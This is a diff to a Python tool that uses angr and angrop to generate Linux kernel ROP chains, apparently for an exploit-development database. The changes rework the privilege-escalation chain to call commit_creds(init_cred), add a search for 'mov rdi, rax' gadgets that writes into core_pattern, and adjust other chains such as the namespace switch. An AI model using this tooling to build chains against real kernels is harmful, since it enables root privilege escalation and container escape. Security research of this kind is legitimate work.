@@ -1,7 +1,6 @@
 #!/usr/bin/env -S python3 -u
 
 import argparse
-from multiprocessing import Pool
 import pathlib
 import subprocess
 import tempfile
@@ -11,7 +10,6 @@ import os
 import angr
 import angrop
 from angrop.rop_gadget import RopGadget
-from angr.misc.loggers import CuteFormatter
 from rop_ret_patcher import patch_vmlinux_return_thunk
 from rop_util import load_symbols, setup_logger
 import gadget_finder
@@ -24,12 +22,14 @@ from kpwn_db.data_model.serialization import *
 BIT_SIZE = 64
 PREPARE_KERNEL_CRED = "prepare_kernel_cred"
 COMMIT_KERNEL_CRED = "commit_creds"
+INIT_CRED = "init_cred"
 FIND_TASK_BY_VPID = "find_task_by_vpid"
 SWITCH_TASK_NAMESPACES = "switch_task_namespaces"
 PARSE_MOUNT_OPTIONS = "parse_mount_options"
 KPTI_TRAMPOLINE = "swapgs_restore_regs_and_return_to_usermode"
 INIT_NSPROXY = "init_nsproxy"
 CORE_PATTERN = "core_pattern"
+CORE_PATTERN_SIZE = 0x80
 MSLEEP = "msleep"
 FORK = "__do_sys_fork"
 RPP_CONTEXT_SIZE = 5
@@ -97,7 +97,7 @@ class RopGeneratorAngrop:
 
     def _load_angrop(self):
         rop = self._project.analyses.ROP(
-            kernel_mode=True, fast_mode=True, only_check_near_rets=False)
+            kernel_mode=True, fast_mode=False, only_check_near_rets=False, max_block_size=14)
         self._find_rop_gadgets(rop)
         return rop
 
@@ -148,14 +148,80 @@ class RopGeneratorAngrop:
                 f"No pop gadget found for the register {reg_name}"
             )
 
-    def _mov_reg_rax(self, reg_name):
-        chain_mov_regs = self._rop.move_regs(**{reg_name: "rax"})
+    def mov_reg_memory_writes(self):
+        """
+        Finds gadgets that perform 'mov rdi, rax' which contain a memory write.
+
+        Args:
+            binary_path: Path to the binary file.
+
+        Returns:
+            A list of dictionaries, where each dictionary contains the gadget and the
+            address controller register for the memory write, or an empty list if none are found.
+        """
+        for gadget in self._rop.rop_gadgets:
+            rdi_rax_found = False
+            for reg_move in gadget.reg_moves:
+                if reg_move.to_reg == 'rdi' and reg_move.from_reg == 'rax' and reg_move.bits == 64:
+                    rdi_rax_found = True
+                    break
+
+            if not rdi_rax_found:
+                continue
+
+            if len(gadget.mem_writes) != 1:  # Check for exactly one memory write
+                continue
+
+            mem_write = gadget.mem_writes[0]  # Get the single memory write
+            addr_dependencies = list(mem_write.addr_dependencies)
+            addr_controllers = list(mem_write.addr_controllers)
+
+            # Check that there's only one address dependency and it's controllable
+            if len(addr_dependencies) == 1 and \
+                    len(addr_controllers) == 1 and \
+                    addr_dependencies[0] == addr_controllers[0]:
+                controller_reg = addr_controllers[0]
+                # Point memory write to the end of core_pattern as a safe place to write
+                write_offset = mem_write.addr_offset
+                write_to_addr = self._find_symbol_addr(
+                    CORE_PATTERN) + CORE_PATTERN_SIZE - 0x8
+                # Handle the write offset  ex: mov [rdi+0x10], rax
+                reg_val = write_to_addr-write_offset
+                kwargs = {controller_reg: reg_val}
+                chain = self._rop.set_regs(**kwargs, preserve_regs=("rax",))
+                chain.add_gadget(gadget)
+                # Handle the stack shifts in mem_write gadget
+                bytes_per_pop = self._project.arch.bytes
+                for _ in range(gadget.stack_change // bytes_per_pop - 1):
+                    chain.add_value(0)
+                chain.print_payload_code()
+                return chain
+
+        return None
+
+    def _mov_rdi_rax(self):
+        """
+        Finds mov rdi, rax gadgets. Different types of gadgets possible:
+        mov rdi, rax ; mov  [rdx], ecx ; mov rax, rdi ; ret ;
+        mov rdi, rax ; add rsi, 0x00000000000002F0 ; rep movsq ; ret ;
+        mov rdi, rax ; mov rsi, 0xFFFFFFFF822C3B60 ; rep movsq ; pop rbp ; ret ;
+        mov rdi, rax ; rep movsq ; xor eax, eax ; pop rbp ; ret ;
+        """
+        chain_mov_regs = None
+        try:
+            chain_mov_regs = self._rop.move_regs(**{"rdi": "rax"})
+        except angrop.errors.RopException:
+            pass
+        if not chain_mov_regs:
+            chain_mov_regs = self.mov_reg_memory_writes()
+        if not chain_mov_regs:
+            raise RopGeneratorError("Unable to find a mov rdi, rax gadget.")
         items = []
         for value, rebased in chain_mov_regs._concretize_chain_values():  # pylint: disable=protected-access
             if rebased:
                 items.append(RopChainOffset(
-                  kernel_offset=value - KERNEL_BASE_ADDRESS,
-                  description=f"mov {reg_name}, rax"))
+                    kernel_offset=value - KERNEL_BASE_ADDRESS,
+                    description=f"mov rdi, rax"))
             else:
                 items.append(RopChainConstant(value))
 
@@ -174,8 +240,10 @@ class RopGeneratorAngrop:
                 mem_write = gadget.mem_writes[0]
 
                 if (
-                    mem_write.addr_controllers == ['rsi']
-                    and mem_write.data_controllers == ['rdi']
+                    len(mem_write.addr_controllers) == 1
+                    and 'rsi' in mem_write.addr_controllers
+                    and len(mem_write.data_controllers) == 1
+                    and 'rdi' in mem_write.data_controllers
                     and mem_write.data_size == 64
                 ):
                     if shortest_gadget is None or gadget.block_length < shortest_gadget.block_length:
@@ -321,12 +389,9 @@ class RopGeneratorAngrop:
         """
         items = [
             self._find_pop_one_reg("rdi"),
-            RopChainConstant(0),
-            self._find_symbol(PREPARE_KERNEL_CRED),
+            self._find_symbol(INIT_CRED),
+            self._find_symbol(COMMIT_KERNEL_CRED)
         ]
-
-        items.extend(self._mov_reg_rax("rdi"))
-        items.append(self._find_symbol(COMMIT_KERNEL_CRED))
 
         return RopAction(
           type_id=0x02,
@@ -345,7 +410,7 @@ class RopGeneratorAngrop:
             self._find_symbol(FIND_TASK_BY_VPID),
         ]
 
-        items.extend(self._mov_reg_rax("rdi"))
+        items.extend(self._mov_rdi_rax())
         items.extend([
             self._find_pop_one_reg("rsi"),
             self._find_symbol(INIT_NSPROXY),
@@ -486,3 +551,4 @@ if __name__ == "__main__":
               repr(action_write_what_where_64) + '\n\n')
         print("Fork\n" + repr(action_fork) + '\n\n')
         print("Telefork\n" + repr(action_telefork) + '\n\n')
+        print("Trampoline Ret\n" + repr(action_trampoline_ret) + '\n\n')
